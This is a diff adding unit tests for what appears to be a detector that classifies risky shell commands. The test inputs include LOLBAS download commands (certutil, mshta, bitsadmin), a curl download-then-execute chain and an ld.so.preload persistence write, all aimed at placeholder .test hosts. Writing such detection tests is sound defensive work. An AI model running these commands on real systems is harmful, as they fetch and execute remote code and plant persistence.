@@ -349,5 +349,32 @@ class TestGeneralization(unittest.TestCase):
         self.assertIn("SF01", self.rules(cmd))
 
 
+
+class TestV044Generalization(unittest.TestCase):
+    def rules(self, cmd):
+        return {f.rule for f in sf.classify_command(cmd, "t")}
+
+    def test_lolbas_certutil_urlcache(self):
+        self.assertIn("SF17", self.rules("certutil -urlcache -split -f https://get.helpers-cdn.test/agent.exe %TEMP%\\agent.exe"))
+
+    def test_lolbas_mshta(self):
+        self.assertIn("SF17", self.rules("mshta https://get.helpers-cdn.test/setup.hta"))
+
+    def test_lolbas_bitsadmin(self):
+        self.assertIn("SF17", self.rules("bitsadmin /transfer job1 /download /priority high https://get.helpers-cdn.test/u.bat %TEMP%\\u.bat"))
+
+    def test_download_then_exec_curl(self):
+        cmd = "curl -fsSL https://codestats-cdn.test/lint.sh -o /tmp/lint.sh && chmod +x /tmp/lint.sh && /tmp/lint.sh"
+        self.assertIn("SF18", self.rules(cmd))
+
+    def test_curl_to_file_and_hash_is_clean(self):
+        cmd = "curl -fsSL https://codestats-cdn.test/lint.sh -o /tmp/lint.sh && sha256sum /tmp/lint.sh"
+        self.assertNotIn("SF18", self.rules(cmd))
+        self.assertNotIn("SF01", self.rules(cmd))
+
+    def test_ld_so_preload_persistence(self):
+        self.assertIn("SF11", self.rules("echo /tmp/libhook.so >> /etc/ld.so.preload"))
+
+
 if __name__ == "__main__":
     unittest.main()
